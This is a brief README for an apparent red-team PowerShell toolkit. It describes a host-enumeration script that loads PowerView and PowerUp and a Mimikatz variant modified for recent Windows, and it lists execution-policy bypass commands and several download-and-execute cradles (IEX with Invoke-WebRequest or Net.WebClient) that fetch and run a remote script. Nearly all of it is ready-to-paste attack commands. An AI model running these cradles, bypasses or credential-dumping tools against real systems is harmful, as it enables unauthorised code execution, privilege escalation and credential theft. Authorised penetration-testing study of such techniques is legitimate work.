```1.ps1``` does basic enumeration of host and pulls down Powerview and PowerUp modules from their original source and attempts to load as modules.

```Invoke-Mimikatz_MOD.ps1``` has been modded to execute on recent Windows versions based on - https://github.com/mitre/caldera/issues/38#issuecomment-396055260

# Bypass EP
Start PowerShell from cmd.exe:

```powershell.exe -ep bypass```

If already running:

```Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass```

```Set-ExecutionPolicy -Scope Process -ExecutionPolicy Restricted```

```$Env:PSExecutionPolicyPreference = 'Bypass'```


# Run Script cradles

```iex (iwr "https://raw.githubusercontent.com/conma293/mvp/main/1.ps1")```

```IEX (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/conma293/mvp/main/1.ps1").Content```



```IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/conma293/mvp/main/1.ps1')```




# More Cradles and general good refs
https://github.com/In3x0rabl3/OSEP/blob/main/osep_reference.md#download-cradle
